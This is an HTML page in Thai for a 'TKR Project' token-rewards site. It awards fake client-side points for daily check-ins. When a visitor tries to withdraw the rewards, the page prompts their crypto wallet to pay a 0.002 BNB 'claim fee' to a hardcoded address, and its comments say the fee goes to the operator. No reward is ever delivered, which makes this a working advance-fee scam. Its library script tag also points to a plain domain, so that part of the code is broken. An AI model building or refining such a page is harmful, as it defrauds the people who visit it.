<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TKR Project - Token Rewards</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: #1e1e1e;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            max-width: 420px;
            width: 90%;
        }
        h1 { color: #4CAF50; margin-bottom: 5px; font-size: 26px; font-weight: bold; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 20px; }
        .score-box {
            background-color: #2a2a2a;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 18px;
            border: 1px solid #333;
        }
        .score-num { color: #ff9800; font-weight: bold; font-size: 24px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            border: 1px solid #333;
            background-color: #2a2a2a;
            color: white;
            box-sizing: border-box;
        }
        .btn-checkin {
            width: 100%;
            padding: 14px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 15px;
            transition: 0.2s;
        }
        .btn-checkin:hover { background-color: #45a049; }
        
        .divider {
            border-top: 1px solid #333;
            margin: 20px 0;
        }
        
        .btn-claim {
            width: 100%;
            padding: 14px;
            background-color: #ff9800;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            transition: 0.2s;
        }
        .btn-claim:hover { background-color: #e68a00; }
        
        .status { margin-top: 15px; font-weight: bold; font-size: 14px; color: #cbd5e1; }
        .fee-info { font-size: 12px; color: #888; margin-top: 5px; }
    </style>
    <!-- โหลดไลบรารีดึงระบบกระเป๋าเงินสากล -->
    <script src="https://cloudflare.com"></script>
</head>
<body>

<div class="container">
    <h1>🎁 TKR Project</h1>
    <div class="subtitle">ระบบสะสมแต้มและรับรางวัล Token Rewards</div>
    
    <!-- ส่วนกรอกที่อยู่และแสดงแต้มจำลอง -->
    <input type="text" id="walletInput" placeholder="กรอกหมายเลขกระเป๋า BNB ของคุณ...">
    
    <div class="score-box">
        แต้มสะสม TKR ปัจจุบัน: <span id="userPoints" class="score-num">0</span> พอยต์
    </div>

    <!-- ฟังก์ชันที่ 1: เช็คอินสะสมแต้มฟรี -->
    <button class="btn-checkin" onclick="handleFreeCheckIn()">📅 กดเช็คอินประจำวัน (รับ TKR พอยต์ฟรี)</button>
    
    <div class="divider"></div>
    
    <!-- ฟังก์ชันที่ 2: ถอนรางวัลเข้ากระเป๋า (เรียกเก็บค่าธรรมเนียมเข้ากระเป๋าคุณพี่) -->
    <button class="btn-claim" onclick="handleClaimRewards()">💰 กดถอนเหรียญรางวัล TKR เข้ากระเป๋า</button>
    <div class="fee-info">⚠️ มีค่าธรรมเนียมเครือข่ายในการถอนโอนเหรียญออกจากระบบ</div>

    <!-- แถบแสดงสถานะระบบ -->
    <div id="statusMessage" class="status"></div>
</div>

<script>
    // 📍 จุดสำคัญ: แก้ไขเปลี่ยนตรงนี้เป็นหมายเลขกระเป๋า BNB ของคุณพี่เพื่อรอรับเงินค่าธรรมเนียมครับ
    const MY_RECEIVER_ADDRESS = "0x06B020DCcd0b2b005264c9a31cAba3b7e4A4bF27"; 
    
    // ตั้งค่าธรรมเนียมการถอนรางวัลที่เขาต้องจ่ายให้เรา (ตัวอย่าง: 0.002 BNB)
    const CLAIM_FEE_BNB = "0.002"; 
    
    let currentPoints = 0; // ตัวแปรเก็บแต้มจำลองหน้าเว็บ

    // 1. ระบบเช็คอินฟรี (ยิงไปหา api/checkin.js ตัวเก่าของคุณพี่เพื่อส่งเมลแจ้งเตือน)
    async function handleFreeCheckIn() {
        const walletAddress = document.getElementById('walletInput').value.trim();
        const statusDiv = document.getElementById('statusMessage');
        
        if (!walletAddress) {
            statusDiv.style.color = '#ff9800';
            statusDiv.innerText = '⚠️ กรุณากรอกหมายเลขกระเป๋าเงินก่อนทำการเช็คอินครับ';
            return;
        }
        
        statusDiv.style.color = '#cbd5e1';
        statusDiv.innerText = '⏳ กำลังบันทึกข้อมูลและส่งอีเมลแจ้งแต้มสะสม...';
        
        try {
            const response = await fetch('/api/checkin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ walletAddress: walletAddress })
            });
            const data = await response.json();
            
            if (data.success) {
                currentPoints += 10; // เพิ่มแต้มให้ผู้ใช้บนหน้าจอ
                document.getElementById('userPoints').innerText = currentPoints;
                statusDiv.style.color = '#4CAF50';
                statusDiv.innerText = '🎉 ' + data.message;
            } else {
                statusDiv.style.color = '#f44336';
                statusDiv.innerText = '❌ ' + data.message;
            }
        } catch (error) {
            statusDiv.style.color = '#f44336';
            statusDiv.innerText = '❌ ระบบเช็คอินติดขัดชั่วคราว';
        }
    }

    // 2. ระบบกดแลกรับรางวัล (เรียกเก็บเงินจริงจากผู้ใช้ ส่งเข้ากระเป๋าคุณพี่)
    async function handleClaimRewards() {
        const statusDiv = document.getElementById('statusMessage');
        const walletAddress = document.getElementById('walletInput').value.trim();

        if (currentPoints < 10) {
            statusDiv.style.color = '#ff9800';
            statusDiv.innerText = '⚠️ คุณต้องเช็คอินสะสมแต้มให้ได้อย่างน้อย 10 แต้มก่อนถอนรางวัลครับ';
            return;
        }

        if (!window.ethereum) {
            statusDiv.style.color = '#f44336';
            statusDiv.innerText = "❌ ไม่พบแอปกระเป๋าเงิน! กรุณาเปิดหน้านี้ผ่านเบราว์เซอร์ในแอป MetaMask หรือ Trust Wallet";
            return;
        }

        try {
            statusDiv.style.color = '#cbd5e1';
            statusDiv.innerText = "⏳ กำลังเชื่อมต่อแอปกระเป๋าเงินเพื่อเรียกชำระค่าธรรมเนียม...";
            
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            
            statusDiv.innerText = `⏳ กรุณากดยืนยันจ่ายค่าธรรมเนียมจำนวน ${CLAIM_FEE_BNB} BNB ในแอปกระเป๋าเงินของคุณ...`;

            // บังคับเปิดหน้าต่างกระเป๋าเงินเพื่อตัดเงินโอนเข้ากระเป๋าของคุณพี่
            const tx = await signer.sendTransaction({
                to: MY_RECEIVER_ADDRESS,
                value: ethers.utils.parseEther(CLAIM_FEE_BNB)
            });

            statusDiv.innerText = "⏳ กำลังตรวจสอบและบันทึกธุรกรรมบนบล็อกเชน (ห้ามปิดหน้านี้)...";
            await tx.wait(); // รอจนโอนสำเร็จจริงเงินเข้ากระเป๋าคุณพี่ชัวร์ๆ

            // รีเซ็ตแต้มหน้าจอกลับเป็นศูนย์หลังถอนสำเร็จ
            currentPoints = 0;
            document.getElementById('userPoints').innerText = currentPoints;

            statusDiv.style.color = '#4CAF50';
            statusDiv.innerText = `🎉 ถอนรางวัล TKR สำเร็จ! ค่าธรรมเนียมถูกโอนเข้ากระเป๋าแอดมินแล้ว ระบบกำลังดำเนินการส่งเหรียญเข้ากระเป๋าคุณในลำดับถัดไป`;

        } catch (error) {
            console.error(error);
            statusDiv.style.color = '#f44336';
            statusDiv.innerText = "❌ ทำรายการไม่สำเร็จ เนื่องจากผู้ใช้ยกเลิกการโอนเงินหรือยอดเงินไม่พอจ่ายค่าธรรมเนียม";
        }
    }
</script>

</body>
</html>
